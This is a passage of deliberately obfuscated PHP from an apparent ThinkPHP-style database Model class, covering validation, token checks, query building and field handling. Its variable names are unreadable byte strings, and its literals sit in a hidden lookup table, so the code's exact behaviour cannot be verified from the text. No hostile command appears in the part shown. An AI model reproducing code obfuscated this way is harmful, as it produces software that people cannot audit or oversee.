$£ö¡¿‘æ[304]: return xml_encode($Ä±èˆŒ); } } return $Ä±èˆŒ; } public function parseFieldsMap($±İ¸…Âß, $öó¶Å™Ô = 1) { if (!empty($this->_map)) { foreach ($this->_map as $‘ŞÌÜ¢Ê => $Àê×¥“½) { if ($öó¶Å™Ô == 1) { if (isset($±İ¸…Âß[$Àê×¥“½])) { $±İ¸…Âß[$‘ŞÌÜ¢Ê] = $±İ¸…Âß[$Àê×¥“½]; unset($±İ¸…Âß[$Àê×¥“½]); } } else { if (isset($±İ¸…Âß[$‘ŞÌÜ¢Ê])) { $±İ¸…Âß[$Àê×¥“½] = $±İ¸…Âß[$‘ŞÌÜ¢Ê]; unset($±İ¸…Âß[$‘ŞÌÜ¢Ê]); } } } } return $±İ¸…Âß; } public function setField($¯ó†×’¸, $¶Í…ƒ©ó = '') { if (is_array($¯ó†×’¸)) { $“š§ÉÄ = $¯ó†×’¸; } else { $“š§ÉÄ[$¯ó†×’¸] = $¶Í…ƒ©ó; } return $this->save($“š§ÉÄ); } public function setAdd($î”‚Ì‹¼, $’ÁšÂ¡¾ = 1) { $É°Šìµ =& $_SERVER[™¾ÇÙ¯¹]; $íÏ“˜ = $î”‚Ì‹¼ . $É°Šìµ[305] . $’ÁšÂ¡¾; if ($’ÁšÂ¡¾ < 0) { $íÏ“˜ = $î”‚Ì‹¼ . $’ÁšÂ¡¾; } return $this->setField($î”‚Ì‹¼, array($É°Šìµ[306], $íÏ“˜)); } public function getField($ø±‡­ó‹, $ ÏıÖ„ = null) { $”æˆêØÍ =& $_SERVER[™¾ÇÙ¯¹]; $·ü³Ş»Ø[$”æˆêØÍ[282]] = $ø±‡­ó‹; $·ü³Ş»Ø = $this->_parseOptions($·ü³Ş»Ø); $ø±‡­ó‹ = trim($ø±‡­ó‹); if (strpos($ø±‡­ó‹, $”æˆêØÍ[50])) { if (!isset($·ü³Ş»Ø[$”æˆêØÍ[301]])) { $·ü³Ş»Ø[$”æˆêØÍ[301]] = is_numeric($ ÏıÖ„) ? $ ÏıÖ„ : $”æˆêØÍ[12]; } $¾ö—›æ = $this->db->select($·ü³Ş»Ø); if (!empty($¾ö—›æ)) { $‡Ò›ÍÓ‹ = explode($”æˆêØÍ[50], $ø±‡­ó‹); $ø±‡­ó‹ = array_keys($¾ö—›æ[0]); $ê¤°Öş = array_shift($ø±‡­ó‹); $¨¶ÀÏ©ú = array_shift($ø±‡­ó‹); $ ô¼¾à¾ = array(); $¤¯×Òìß = count($‡Ò›ÍÓ‹); foreach ($¾ö—›æ as $“¹¶´ù) { $ç¾èõÄ = $“¹¶´ù[$ê¤°Öş]; if (2 == $¤¯×Òìß) { $ ô¼¾à¾[$ç¾èõÄ] = $“¹¶´ù[$¨¶ÀÏ©ú]; } else { $ ô¼¾à¾[$ç¾èõÄ] = is_string($ ÏıÖ„) ? implode($ ÏıÖ„, $“¹¶´ù) : $“¹¶´ù; } } return $ ô¼¾à¾; } } else { if (!0 !== $ ÏıÖ„) { $·ü³Ş»Ø[$”æˆêØÍ[301]] = is_numeric($ ÏıÖ„) ? $ ÏıÖ„ : 1; } if ($ ÏıÖ„ === $”æˆêØÍ[264]) { unset($·ü³Ş»Ø[$”æˆêØÍ[301]]); } $“¹¶´ù = $this->db->select($·ü³Ş»Ø); if (!empty($“¹¶´ù)) { if ($ ÏıÖ„ === $”æˆêØÍ[264]) { return reset($“¹¶´ù[0]); } if (!0 !== $ ÏıÖ„ && 1 == $·ü³Ş»Ø[$”æˆêØÍ[301]]) { return reset($“¹¶´ù[0]); } foreach ($“¹¶´ù as $¢½¶¬üâ) { $äµ÷Ì [] = $¢½¶¬üâ[$ø±‡­ó‹]; } return $äµ÷Ì ; } } return null; } public function create($è“‰Œ = '', $“’ğû‚™ = '') { $ÉÉëéÏş =& $_SERVER[™¾ÇÙ¯¹]; if (empty($è“‰Œ)) { $è“‰Œ = $_POST; } elseif (is_object($è“‰Œ)) { $è“‰Œ = get_object_vars($è“‰Œ); } if (empty($è“‰Œ) || !is_array($è“‰Œ)) { $this->error = think_lang($ÉÉëéÏş[280]); return !1; } $è“‰Œ = $this->parseFieldsMap($è“‰Œ, 0); $“’ğû‚™ = $“’ğû‚™ ? $“’ğû‚™ : (!empty($è“‰Œ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$ÉÉëéÏş[282]])) { $Ãò’­Ş = $this->options[$ÉÉëéÏş[282]]; unset($this->options[$ÉÉëéÏş[282]]); } elseif ($“’ğû‚™ == THINK_MODEL_INSERT && isset($this->insertFields)) { $Ãò’­Ş = $this->insertFields; } elseif ($“’ğû‚™ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $Ãò’­Ş = $this->updateFields; } if (isset($Ãò’­Ş)) { if (is_string($Ãò’­Ş)) { $Ãò’­Ş = explode($ÉÉëéÏş[50], $Ãò’­Ş); } if (think_config($ÉÉëéÏş[307])) { $Ãò’­Ş[] = think_config($ÉÉëéÏş[308]); } foreach ($è“‰Œ as $Éªºò¨ => $ş¡’™’Ê) { if (!in_array($Éªºò¨, $Ãò’­Ş)) { unset($è“‰Œ[$Éªºò¨]); } } } if (!$this->autoValidation($è“‰Œ, $“’ğû‚™)) { return !1; } if (!$this->autoCheckToken($è“‰Œ)) { $this->error = think_lang($ÉÉëéÏş[309]); return !1; } if ($this->autoCheckFields) { $Ãò’­Ş = $this->getDbFields(); foreach ($è“‰Œ as $Éªºò¨ => $ş¡’™’Ê) { if (!in_array($Éªºò¨, $Ãò’­Ş)) { unset($è“‰Œ[$Éªºò¨]); } elseif (MAGIC_QUOTES_GPC && is_string($ş¡’™’Ê)) { $è“‰Œ[$Éªºò¨] = stripslashes($ş¡’™’Ê); } } } $this->autoOperation($è“‰Œ, $“’ğû‚™); $this->data = $è“‰Œ; return $è“‰Œ; } public function autoCheckToken($’ŞâªÎí) { $¦­Ëº¦‘ =& $_SERVER[™¾ÇÙ¯¹]; if (isset($this->options[$¦­Ëº¦‘[310]]) && !$this->options[$¦­Ëº¦‘[310]]) { return !0; } if (think_config($¦­Ëº¦‘[307])) { $‘ºÍÏ°€ = think_config($¦­Ëº¦‘[308]); if (!isset($’ŞâªÎí[$‘ºÍÏ°€]) || Session::get($‘ºÍÏ°€)) { return !1; } list($´ÜŒ»—, $Ôİ²–ÊÍ) = explode($¦­Ëº¦‘[11], $’ŞâªÎí[$‘ºÍÏ°€]); if ($Ôİ²–ÊÍ && Session::get($‘ºÍÏ°€ . $¦­Ëº¦‘[10] . $´ÜŒ»—) === $Ôİ²–ÊÍ) { Session::remove($‘ºÍÏ°€ . $¦­Ëº¦‘[10] . $´ÜŒ»—); return !0; } if (think_config($¦­Ëº¦‘[311])) { Session::remove($‘ºÍÏ°€ . $¦­Ëº¦‘[10] . $´ÜŒ»—); } return !1; } return !0; } public function regex($½ã…á‚À, $öãÑ¯ÇÎ) { $¶ŞÃº‘… =& $_SERVER[™¾ÇÙ¯¹]; $Ì¨–¢«™ = array($¶ŞÃº‘…[312] => $¶ŞÃº‘…[313], $¶ŞÃº‘…[314] => $¶ŞÃº‘…[315], $¶ŞÃº‘…[316] => $¶ŞÃº‘…[317], $¶ŞÃº‘…[318] => $¶ŞÃº‘…[319], $¶ŞÃº‘…[320] => $¶ŞÃº‘…[321], $¶ŞÃº‘…[322] => $¶ŞÃº‘…[323], $¶ŞÃº‘…[324] => $¶ŞÃº‘…[325], $¶ŞÃº‘…[299] => $¶ŞÃº‘…[326], $¶ŞÃº‘…[327] => $¶ŞÃº‘…[328]); if (isset($Ì¨–¢«™[strtolower($öãÑ¯ÇÎ)])) { $öãÑ¯ÇÎ = $Ì¨–¢«™[strtolower($öãÑ¯ÇÎ)]; } return preg_match($öãÑ¯ÇÎ, $½ã…á‚À) === 1; } private function autoOperation(&$“¦ÊÄÔø, $à°ï¬Âˆ) { $ã”œ›é =& $_SERVER[™¾ÇÙ¯¹]; if (!empty($this->options[$ã”œ›é[329]])) { $úŒ½½É = $this->options[$ã”œ›é[329]]; unset($this->options[$ã”œ›é[329]]); } elseif (!empty($this->_auto)) { $úŒ½½É = $this->_auto; } if (isset($úŒ½½É)) { foreach ($úŒ½½É as $àĞİÜœ„) { if (empty($àĞİÜœ„[2])) { $àĞİÜœ„[2] = THINK_MODEL_INSERT; } if ($à°ï¬Âˆ == $àĞİÜœ„[2] || $àĞİÜœ„[2] == THINK_MODEL_BOTH) { switch (trim($àĞİÜœ„[3])) { case $ã”œ›é[330]: case $ã”œ›é[331]: $è‡ó®è— = isset($àĞİÜœ„[4]) ? (array) $àĞİÜœ„[4] : array(); if (isset($“¦ÊÄÔø[$àĞİÜœ„[0]])) { array_unshift($è‡ó®è—, $“¦ÊÄÔø[$àĞİÜœ„[0]]); } if ($ã”œ›é[330] == $àĞİÜœ„[3]) { $“¦ÊÄÔø[$àĞİÜœ„[0]] = call_user_func_array($àĞİÜœ„[1], $è‡ó®è—); } else { $“¦ÊÄÔø[$àĞİÜœ„[0]] = call_user_func_array(array(&$this, $àĞİÜœ„[1]), $è‡ó®è—); } break; case $ã”œ›é[282]: $“¦ÊÄÔø[$àĞİÜœ„[0]] = $“¦ÊÄÔø[$àĞİÜœ„[1]]; break; case $ã”œ›é[332]: if ($ã”œ›é[12] === $“¦ÊÄÔø[$àĞİÜœ„[0]]) { unset($“¦ÊÄÔø[$àĞİÜœ„[0]]); } break; case $ã”œ›é[333]: default: $“¦ÊÄÔø[$àĞİÜœ„[0]] = $àĞİÜœ„[1]; } if (!1 === $“¦ÊÄÔø[$àĞİÜœ„[0]]) { unset($“¦ÊÄÔø[$àĞİÜœ„[0]]); } } } } return $“¦ÊÄÔø; } protected function autoValidation($²ø’Å„Ø, $Äæ§øê¦) { $—·õÌ‹– =& $_SERVER[™¾ÇÙ¯¹]; if (!empty($this->options[$—·õÌ‹–[334]])) { $¢êù´Ì = $this->options[$—·õÌ‹–[334]]; unset($this->options[$—·õÌ‹–[334]]); } elseif (!empty($this->_validate)) { $¢êù´Ì = $this->_validate; } if (isset($¢êù´Ì)) { if ($this->patchValidate) { $this->error = array(); } foreach ($¢êù´Ì as $Ç¸ûåş” => $¼®ÖÉ’·) { if (empty($¼®ÖÉ’·[5]) || $¼®ÖÉ’·[5] == THINK_MODEL_BOTH || $¼®ÖÉ’·[5] == $Äæ§øê¦) { if (0 == strpos($¼®ÖÉ’·[2], $—·õÌ‹–[335]) && strpos($¼®ÖÉ’·[2], $—·õÌ‹–[336])) { $¼®ÖÉ’·[2] = think_lang(substr($¼®ÖÉ’·[2], 2, -1)); } $¼®ÖÉ’·[3] = isset($¼®ÖÉ’·[3]) ? $¼®ÖÉ’·[3] : THINK_EXISTS_VALIDATE; $¼®ÖÉ’·[4] = isset($¼®ÖÉ’·[4]) ? $¼®ÖÉ’·[4] : $—·õÌ‹–[337]; switch ($¼®ÖÉ’·[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($²ø’Å„Ø, $¼®ÖÉ’·)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($—·õÌ‹–[12] != trim($²ø’Å„Ø[$¼®ÖÉ’·[0]])) { if (!1 === $this->_validationField($²ø’Å„Ø, $¼®ÖÉ’·)) { return !1; } } break; default: if (isset($²ø’Å„Ø[$¼®ÖÉ’·[0]])) { if (!1 === $this->_validationField($²ø’Å„Ø, $¼®ÖÉ’·)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($™Îâ‚š®, $âÑ©‰×™) { if (!1 === $this->_validationFieldItem($™Îâ‚š®, $âÑ©‰×™)) { if ($this->patchValidate) { $this->error[$âÑ©‰×™[0]] = $âÑ©‰×™[2]; } else { $this->error = $âÑ©‰×™[2]; return !1; } } return; } protected function _validationFieldItem($”†–ìßé, $‘ ü¶æÅ) { $Ó’èó‡ =& $_SERVER[™¾ÇÙ¯¹]; switch (strtolower(trim($‘ ü¶æÅ[4]))) { case $Ó’èó‡[330]: case $Ó’èó‡[331]: $ÂĞÚß´ç = isset($‘ ü¶æÅ[6]) ? (array) $‘ ü¶æÅ[6] : array(); if (is_string($‘ ü¶æÅ[0]) && strpos($‘ ü¶æÅ[0], $Ó’èó‡[50])) { $‘ ü¶æÅ[0] = explode($Ó’èó‡[50], $‘ ü¶æÅ[0]); } if (is_array($‘ ü¶æÅ[0])) { foreach ($‘ ü¶æÅ[0] as $Ñá£¤Óœ) { $óáº‘üÊ[$Ñá£¤Óœ] = $”†–ìßé[$Ñá£¤Óœ]; } array_unshift($ÂĞÚß´ç, $óáº‘üÊ); } else { array_unshift($ÂĞÚß´ç, $”†–ìßé[$‘ ü¶æÅ[0]]); } if ($Ó’èó‡[330] == $‘ ü¶æÅ[4]) { return call_user_func_array($‘ ü¶æÅ[1], $ÂĞÚß´ç); } else { return call_user_func_array(array(&$this, $‘ ü¶æÅ[1]), $ÂĞÚß´ç); } case $Ó’èó‡[338]: return $”†–ìßé[$‘ ü¶æÅ[0]] == $”†–ìßé[$‘ ü¶æÅ[1]]; case $Ó’èó‡[339]: if (is_string($‘ ü¶æÅ[0]) && strpos($‘ ü¶æÅ[0], $Ó’èó‡[50])) { $‘ ü¶æÅ[0] = explode($Ó’èó‡[50], $‘ ü¶æÅ[0]); } $õØéĞ„ = array(); if (is_array($‘ ü¶æÅ[0])) { foreach ($‘ ü¶æÅ[0] as $Ñá£¤Óœ) { $õØéĞ„[$Ñá£¤Óœ] = $”†–ìßé[$Ñá£¤Óœ]; } } else { $õØéĞ„[$‘ ü¶æÅ[0]] = $”†–ìßé[$‘ ü¶æÅ[0]]; } if (!empty($”†–ìßé[$this->getPk()])) { $õØéĞ„[$this->getPk()] = array($Ó’èó‡[340], $”†–ìßé[$this->getPk()]); } if ($this->where($õØéĞ„)->find()) { return !1; } return !0; default: return $this->check($”†–ìßé[$‘ ü¶æÅ[0]], $‘ ü¶æÅ[1], $‘ ü¶æÅ[4]); } } public function check($¤º‰°óá, $ùƒ¥ªÄ†, $¹ê€¤¹õ = "\x72\x65\x67\145\x78") { $í›ù³ù– =& $_SERVER[™¾ÇÙ¯¹]; $¹ê€¤¹õ = strtolower(trim($¹ê€¤¹õ)); switch ($¹ê€¤¹õ) { case $í›ù³ù–[7]: case $í›ù³ù–[341]: $Å¾Úü§‚ = is_array($ùƒ¥ªÄ†) ? $ùƒ¥ªÄ† : explode($í›ù³ù–[50], $ùƒ¥ªÄ†); return $¹ê€¤¹õ == $í›ù³ù–[7] ? in_array($¤º‰°óá, $Å¾Úü§‚) : !in_array($¤º‰°óá, $Å¾Úü§‚); case $í›ù³ù–[342]: case $í›ù³ù–[343]: if (is_array($ùƒ¥ªÄ†)) { $ÀÉÉ¬ä† = $ùƒ¥ªÄ†[0]; $ØùœªÌ¯ = $ùƒ¥ªÄ†[1]; } else { list($ÀÉÉ¬ä†, $ØùœªÌ¯) = explode($í›ù³ù–[50], $ùƒ¥ªÄ†); } return $¹ê€¤¹õ == $í›ù³ù–[342] ? $¤º‰°óá >= $ÀÉÉ¬ä† && $¤º‰°óá <= $ØùœªÌ¯ : $¤º‰°óá < $ÀÉÉ¬ä† || $¤º‰°óá > $ØùœªÌ¯; case $í›ù³ù–[344]: case $í›ù³ù–[345]: return $¹ê€¤¹õ == $í›ù³ù–[344] ? $¤º‰°óá == $ùƒ¥ªÄ† : $¤º‰°óá != $ùƒ¥ªÄ†; case $í›ù³ù–[346]: $¶¢¤ÜÈÎ = mb_strlen($¤º‰°óá, $í›ù³ù–[347]); if (strpos($ùƒ¥ªÄ†, $í›ù³ù–[50])) { list($ÀÉÉ¬ä†, $ØùœªÌ¯) = explode($í›ù³ù–[50], $ùƒ¥ªÄ†); return $¶¢¤ÜÈÎ >= $ÀÉÉ¬ä† && $¶¢¤ÜÈÎ <= $ØùœªÌ¯; } else { return $¶¢¤ÜÈÎ == $ùƒ¥ªÄ†; } case $í›ù³ù–[348]: list($Û›°ò, $à¼å¯£¯) = explode($í›ù³ù–[50], $ùƒ¥ªÄ†); if (!is_numeric($Û›°ò)) { $Û›°ò = strtotime($Û›°ò); } if (!is_numeric($à¼å¯£¯)) { $à¼å¯£¯ = strtotime($à¼å¯£¯); } return NOW_TIME >= $Û›°ò && NOW_TIME <= $à¼å¯£¯; case $í›ù³ù–[349]: return in_array(get_client_ip(), explode($í›ù³ù–[50], $ùƒ¥ªÄ†)); case $í›ù³ù–[350]: return !in_array(get_client_ip(), explode($í›ù³ù–[50], $ùƒ¥ªÄ†)); case $í›ù³ù–[337]: default: return $this->regex($¤º‰°óá, $ùƒ¥ªÄ†); } } public function query($ÜÀú‘Ì”, $ùõëÓÔ = false) { $—Êˆúç± =& $_SERVER[™¾ÇÙ¯¹]; if (!is_bool($ùõëÓÔ) && !is_array($ùõëÓÔ)) { $ùõëÓÔ = func_get_args(); array_shift($ùõëÓÔ); } $ÜÀú‘Ì” = str_replace(array($—Êˆúç±[231], $—Êˆúç±[351]), $—Êˆúç±[53], $ÜÀú‘Ì”); $ÜÀú‘Ì” = $this->parseSql($ÜÀú‘Ì”, $ùõëÓÔ); return $this->db->query($ÜÀú‘Ì”); } public function execute($•µŒÖ°, $Ï€÷ı×ˆ = false) { if (!is_bool($Ï€÷ı×ˆ) && !is_array($Ï€÷ı×ˆ)) { $Ï€÷ı×ˆ = func_get_args(); array_shift($Ï€÷ı×ˆ); } $•µŒÖ° = $this->parseSql($•µŒÖ°, $Ï€÷ı×ˆ); return $this->db->execute($•µŒÖ°); } protected function parseSql($Û´Ó ¦ü, $ı¿Ù¦Ä¡) { $õ…‹İËì =& $_SERVER[™¾ÇÙ¯¹]; if (!0 === $ı¿Ù¦Ä¡) { $šÁøô×³ = $this->_parseOptions(); $Û´Ó ¦ü = $this->db->parseSql($Û´Ó ¦ü, $šÁøô×³); } elseif (is_array($ı¿Ù¦Ä¡)) { $ı¿Ù¦Ä¡ = array_map(array($this->db, $õ…‹İËì[352]), $ı¿Ù¦Ä¡); $Û´Ó ¦ü = vsprintf($Û´Ó ¦ü, $ı¿Ù¦Ä¡); } else { $Û´Ó ¦ü = strtr($Û´Ó ¦ü, array($õ…‹İËì[353] => $this->getTableName(), $õ…‹İËì[354] => think_config($õ…‹İËì[253]))); } $this->db->setModel($this->name); return $Û´Ó ¦ü; } public function db($°ã¹ÂŞ¦ = '', $Ò¢²Ó“° = '', $ç¡âàñš = array()) { $“Ôˆ ŒÇ =& $_SERVER[™¾ÇÙ¯¹]; if ($“Ôˆ ŒÇ[12] === $°ã¹ÂŞ¦ && $this->db) { return $this->db; } static $»—‚Õ¸Ù = array(); static $áÓüöù¢ = array(); if (!isset($áÓüöù¢[$°ã¹ÂŞ¦]) || isset($áÓüöù¢[$°ã¹ÂŞ¦]) && $Ò¢²Ó“° && $»—‚Õ¸Ù[$°ã¹ÂŞ¦] != $Ò¢²Ó“°) { if (!empty($Ò¢²Ó“°) && is_string($Ò¢²Ó“°) && !1 === strpos($Ò¢²Ó“°, $“Ôˆ ŒÇ[8])) { $Ò¢²Ó“° = think_config($Ò¢²Ó“°); } $°ã¹ÂŞ¦ = think_guid($Ò¢²Ó“°); $áÓüöù¢[$°ã¹ÂŞ¦] = Db::getInstance($Ò¢²Ó“°); } elseif (NULL === $Ò¢²Ó“°) { $áÓüöù¢[$°ã¹ÂŞ¦]->close(); unset($áÓüöù¢[$°ã¹ÂŞ¦]); return; } if (!empty($ç¡âàñš)) { if (is_string($ç¡âàñš)) { parse_str($ç¡âàñš, $ç¡âàñš); } foreach ($ç¡âàñš as $˜ìˆãİõ => $˜Û¤ı´è) { $this->setProperty($˜ìˆãİõ, $˜Û¤ı´è); } } $»—‚Õ¸Ù[$°ã¹ÂŞ¦] = $Ò¢²Ó“°; $this->db = $áÓüöù¢[$°ã¹ÂŞ¦]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $¬¯¸ê¬Ü = get_class($this); if ($¬¯¸ê¬Ü == $_SERVER[™¾ÇÙ¯¹][355]) { return $this->name; } $this->name = substr($¬¯¸ê¬Ü, 0, -5); } return $this->name; } public function getTableName() { $­ „íâ€ =& $_SERVER[™¾ÇÙ¯¹]; if (empty($this->trueTableName)) { $¯ÊÉ£‘™ = !empty($this->tablePrefix) ? $this->tablePrefix : $­ „íâ€[12]; if (!empty($this->tableName)) { $¯ÊÉ£‘™ .= $this->tableName; } else { $¯ÊÉ£‘™ .= think_parse_name($this->name); } $this->trueTableName = strtolower($¯ÊÉ£‘™); } return (!empty($this->dbName) ? $this->dbName . $­ „íâ€[10] : $­ „íâ€[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $Šº¼•É× =& $_SERVER[™¾ÇÙ¯¹]; return isset($this->fields[$Šº¼•É×[260]]) ? $this->fields[$Šº¼•É×[260]] : $this->pk; } public function getDbFields() { $¡·¥³ =& $_SERVER[™¾ÇÙ¯¹]; if (isset($this->options[$¡·¥³[288]])) { $§‘•“’ = $this->db->getFields($this->options[$¡·¥³[288]]); return $§‘•“’ ? array_keys($§‘•“’) : !1; } if ($this->fields) { $§‘•“’ = $this->fields; unset($§‘•“’[$¡·¥³[259]], $§‘•“’[$¡·¥³[260]], $§‘•“’[$¡·¥³[261]], $§‘•“’[$¡·¥³[258]]); return $§‘•“’; } return !1; } public function data($¦™¬Õæ´ = '') { $×öèÑëş =& $_SERVER[™¾ÇÙ¯¹]; if ($×öèÑëş[12] === $¦™¬Õæ´ && !empty($this->data)) { return $this->data; } if (is_object($¦™¬Õæ´)) { $¦™¬Õæ´ = get_object_vars($¦™¬Õæ´); } elseif (is_string($¦™¬Õæ´)) { parse_str($¦™¬Õæ´, $¦™¬Õæ´); } elseif (!is_array($¦™¬Õæ´)) { think_exception(think_lang($×öèÑëş[280])); } $this->data = $¦™¬Õæ´; return $this; } public function join($äÌõ†œ) { $¹ŸÈÊ¯Î =& $_SERVER[™¾ÇÙ¯¹]; if (is_array($äÌõ†œ)) { $this->options[$¹ŸÈÊ¯Î[291]] = $äÌõ†œ; } elseif (!empty($äÌõ†œ)) { $this->options[$¹ŸÈÊ¯Î[291]][] = $äÌõ†œ; } return $this; } public function union($ƒ³‰´œ‡, $âÇ«ä‘Ò = false) { $“ ÈàğÂ =& $_SERVER[™¾ÇÙ¯¹]; if (empty($ƒ³‰´œ‡)) { return $this; } if ($âÇ«ä‘Ò) { $this->options[$“ ÈàğÂ[356]][$“ ÈàğÂ[357]] = !0; } if (is_object($ƒ³‰´œ‡)) { $ƒ³‰´œ‡ = get_object_vars($ƒ³‰´œ‡); } if (is_string($ƒ³‰´œ‡)) { $à¾‘õ˜ = $ƒ³‰´œ‡; } elseif (is_array($ƒ³‰´œ‡)) { if (isset($ƒ³‰´œ‡[0])) { $this->options[$“ ÈàğÂ[356]] = array_merge($this->options[$“ ÈàğÂ[356]], $ƒ³‰´œ‡); return $this; } else { $à¾‘õ˜ = $ƒ³‰´œ‡; } } else { think_exception(think_lang($“ ÈàğÂ[280])); } $this->options[$“ ÈàğÂ[356]][] = $à¾‘õ˜; return $this; } public function cache($ñµæ½Õ = true, $õµƒºıÔ = null, $Ğï—æÅÏ = '') { $Ûıå‚ñ =& $_SERVER[™¾ÇÙ¯¹]; if (!1 !== $ñµæ½Õ) { $this->options[$Ûıå‚ñ[358]] = array($Ûıå‚ñ[94] => $ñµæ½Õ, $Ûıå‚ñ[348] => $õµƒºıÔ, $Ûıå‚ñ[33] => $Ğï—æÅÏ); } return $this; } public function field($‘åõ–ûù, $‘„©Àƒö = false) { $•¾˜ˆ· =& $_SERVER[™¾ÇÙ¯¹]; if (!0 === $‘åõ–ûù) { $…ğî¯±» = $this->getDbFields(); $‘åõ–ûù = $…ğî¯±» ? $…ğî¯±» : $•¾˜ˆ·[188]; } elseif ($‘„©Àƒö) { if (is_string($‘åõ–ûù)) { $‘åõ–ûù = explode($•¾˜ˆ·[50], $‘åõ–ûù); } $…ğî¯±» = $this->getDbFields(); $‘åõ–ûù = $…ğî¯±» ? array_diff($…ğî¯±», $‘åõ–ûù) : $‘åõ–ûù; } $this->options[$•¾˜ˆ·[282]] = $‘åõ–ûù; return $this; } public function scope($™ ıùš¿ = '', $½é¬ÏØ = NULL) { $„Ùçıãù =& $_SERVER[™¾ÇÙ¯¹]; if ($„Ùçıãù[12] === $™ ıùš¿) { if (isset($this->_scope[$„Ùçıãù[37]])) { $áùı¦¬î = $this->_scope[$„Ùçıãù[37]]; } else { return $this; } } elseif (is_string($™ ıùš¿)) { $Ê‡Ú»¯… = explode($„Ùçıãù[50], $™ ıùš¿); $áùı¦¬î = array(); foreach ($Ê‡Ú»¯… as $€èÁ¡†ù) { if (!isset($this->_scope[$€èÁ¡†ù])) { continue; } $áùı¦¬î = array_merge($áùı¦¬î, $this->_scope[$€èÁ¡†ù]); } if (!empty($½é¬ÏØ) && is_array($½é¬ÏØ)) { $áùı¦¬î = array_merge($áùı¦¬î, $½é¬ÏØ); } } elseif (is_array($™ ıùš¿)) { $áùı¦¬î = $™ ıùš¿; } if (is_array($áùı¦¬î) && !empty($áùı¦¬î)) { $this->options = array_merge($this->options, array_change_key_case($áùı¦¬î)); } return $this; } public function where($¼Ğä·Şì, $„—’²Ã… = null) { $›¶ä£ÚÈ =& $_SERVER[™¾ÇÙ¯¹]; if (!is_null($„—’²Ã…) && is_string($¼Ğä·Şì)) { if (!is_array($„—’²Ã…)) { $„—’²Ã… = func_get_args(); array_shift($„—’²Ã…); } $„—’²Ã… = array_map(array($this->db, $›¶ä£ÚÈ[352]), $„—’²Ã…); $¼Ğä·Şì = vsprintf($¼Ğä·Şì, $„—’²Ã…); } elseif (is_object($¼Ğä·Şì)) { $¼Ğä·Şì = get_object_vars($¼Ğä·Şì); } elseif (is_array($¼Ğä·Şì)) { foreach ($¼Ğä·Şì as $¡¡¥¡ÄŸ => $‹Şíşß”) { if ((is_numeric($¡¡¥¡ÄŸ) || !$¡¡¥¡ÄŸ) && is_string($‹Şíşß”)) { if (strpos($‹Şíşß”, $›¶ä£ÚÈ[359]) === 0) { continue; } think_trace($›¶ä£ÚÈ[360], $›¶ä£ÚÈ[12], $›¶ä£ÚÈ[49]); die; } } } if (is_string($¼Ğä·Şì) && $›¶ä£ÚÈ[12] != $¼Ğä·Şì) { $ÌşÍÜŞ½ = array(); $ÌşÍÜŞ½[$›¶ä£ÚÈ[361]] = $¼Ğä·Şì; $¼Ğä·Şì = $ÌşÍÜŞ½; } if (isset($this->options[$›¶ä£ÚÈ[284]])) { $this->options[$›¶ä£ÚÈ[284]] = array_merge($this->options[$›¶ä£ÚÈ[284]], $¼Ğä·Şì); } else { $this->options[$›¶ä£ÚÈ[284]] = $¼Ğä·Şì; } return $this; } public function limit($èÎõ¥¡®, $™É»’ºú = null) { $Á‡ÜÉä€ =& $_SERVER[™¾ÇÙ¯¹]; $this->options[$Á‡ÜÉä€[301]] = is_null($™É»’ºú) ? $èÎõ¥¡® : $èÎõ¥¡® . $Á‡ÜÉä€[50] . $™É»’ºú; return $this; } public function page($¦¬ô‡·Ä, $Öºß¤¹à = null) { $çı’’Ÿı =& $_SERVER[™¾ÇÙ¯¹]; $this->options[$çı’’Ÿı[362]] = is_null($Öºß¤¹à) ? $¦¬ô‡·Ä : $¦¬ô‡·Ä . $çı’’Ÿı[50] . $Öºß¤¹à; return $this; } public function comment($Ï‰”Ïœ) { $this->options[$_SERVER[™¾ÇÙ¯¹][363]] = $Ï‰”Ïœ; return $this; } public function setProperty($’¢î¤úé, $Şç“ƒ‹) { if (property_exists($this, $’¢î¤úé)) { $this->{$’¢î¤úé} = $Şç“ƒ‹; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\x64\x69\146\171\x54\x69\155\x65", "\x74\151\x6d\145", "\x69\x6e\163\145\x72\164\x2c\165\x70\x64\x61\164\145", "\x66\x75\x6e\143\164\151\157\156"), array("\143\162\x65\x61\x74\145\x54\x69\155\x65", "\164\x69\x6d\x65", "\x69\156\x73\145\x72\x74", "\146\165\x6e\x63\x74\151\157\x6e")); public function setDataAuto($áÇÁ”Ú) { $this->dataAuto = $áÇÁ”Ú; } public function __construct($ÆºÊÇ·Ö = '', $ÏÖÅı‚Ş = '', $òùşß–· = '') { parent::__construct($ÆºÊÇ·Ö, $ÏÖÅı‚Ş, $òùşß–·); } protected $tableMeta = array(); protected function _beforeInsert(&$šå• », $„€±Õ‘Ù) { $×›«¢Òİ =& $_SERVER[™¾ÇÙ¯¹]; if (!$this->checkDataAutoHas($×›«¢Òİ[364])) { return; } $this->dataBeforeFilter($šå• », $×›«¢Òİ[364]); } protected function _beforeUpdate(&$·İãòÈú, $ãæº‚µ½) { $¸§‚—Œã =& $_SERVER[™¾ÇÙ¯¹]; if (!$this->checkDataAutoHas($¸§‚—Œã[365])) { return; } $this->dataBeforeFilter($·İãòÈú, $¸§‚—Œã[365]); } protected function _afterSelect(&$ß»şİ, $£à«œ°) { if (!is_array($ß»şİ)) { return; } if (!$this->checkDataAutoHas($_SERVER[™¾ÇÙ¯¹][366])) { return; } foreach ($ß»şİ as &$Ä‹Ô·ã) { $this->dataAfterFilter($Ä‹Ô·ã); } unset($Ä‹Ô·ã); } protected function _afterFind(&$Ñ…ßÂÌ, $éìÖ»ğû) { if (!is_array($Ñ…ßÂÌ)) { return; } if 